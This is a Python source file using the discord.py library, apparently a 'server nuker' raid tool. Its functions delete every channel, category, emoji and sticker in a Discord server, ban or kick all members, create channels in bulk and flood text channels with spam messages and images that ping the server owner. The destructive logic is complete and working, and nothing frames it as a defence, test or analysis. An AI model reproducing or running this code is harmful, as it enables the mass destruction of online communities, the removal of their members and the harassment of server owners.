import discord
from config import *


async def delete_channels(guild):
    if b_delete_text_channels:
        for channel in guild.text_channels:
            await channel.delete()
    if b_delete_voice_channels:
        for channel in guild.voice_channels:
            await channel.delete()
    if b_delete_categories:
        for category in guild.categories:
            await category.delete()


async def ban_or_kick(guild):
    for member in guild.members:
        if b_ban_users:
            await member.ban()
        elif b_kick_users:
            await member.kick()


async def delete_emojis(guild):
    for emoji in guild.emojis:
        await emoji.delete()


async def delete_stickers(guild):
    for sticker in guild.stickers:
        await sticker.delete()


async def create_channels(guild):
    for i in range(1, num_spam_channels + 1):
        cat = None
        if b_create_categories:
            cat = await guild.create_category(f"{category_name} {i}")
        if b_create_text_channels:
            await guild.create_text_channel(name=text_channel_name, category=cat)
        if b_create_voice_channels:
            await guild.create_voice_channel(name=voice_channel_name, category=cat)


async def spam(guild):
    for channel in guild.text_channels:
        if b_spam_text_channels:
            await channel.send(f"{spam_message}\n{guild.owner.mention}")
        if b_spam_images:
            await channel.send(file=discord.File(fp=spam_img))
